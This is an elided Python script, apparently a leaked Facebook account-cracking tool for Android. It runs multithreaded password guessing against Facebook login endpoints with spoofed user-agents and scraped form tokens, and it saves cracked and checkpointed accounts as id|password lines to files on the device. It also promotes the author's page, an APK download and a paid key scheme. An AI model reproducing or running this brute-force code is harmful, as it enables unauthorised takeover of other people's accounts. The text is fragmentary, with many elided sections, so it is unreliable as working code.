#LEAKED BY : NOOR TRICKER 

#AIKNG TATA LATEST SC 
...
os.system('xdg-open https://www.facebook.com/Mr.Romantic.H.S/')
...
try:
        ...
        os.system('python NOOR.py')

except:pass

        

fbks=("SupportsFresco=1 modular=1 Dalvik/2.1.0 (Linux; U; Android 9.1.1; Y71 Pro Build/24.1.A.0.550) [FBAN/Orca-Android;FBAV/321.0.0.5.347;FBBV/20097295;FBDM/{density=1.2,width=510,height=845};FBLC/hi-IN;FBCR/Airtel;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.orca;FBDV/Y71 Pro;FBSV/9.1.2;nullFBCA/armeabi-v7a:armeabi;]")
...
----------------------------------------------
 ...
 N-O-O-R Pro version 1.0

 For Haters: HXN-TRICKER NAME TO SUNA HOGA
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/NOOR_VPN1.0.apk/file');menu()
                        ...
                        tks = ("Hi NOOR Sir, I Need To Buy Your Paid NOOR PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python NOOR.py')
...
def pak():
                ...
                with tred(max_workers=30) as NOOR:     
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [HXN-TRICKER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        NOOR=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in NOOR:
                                ...
                                print('\r\r\033[1;32m [HXN-OK] %s | %s'%(ids,pas))

                                open('/sdcard/HXN-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in NOOR:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [HXN-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/HXN-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                log_data = {
				                   ...
				                   "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),			                       "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [HXN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                print('\r\r\x1b[38;5;208m [HXN-OK] '+ids+' | '+pas+'\033[1;97m')
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',}
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/HXN-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [HXN-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/HXN-OK.txt','a').write(uid+'|'+pas+'\n')
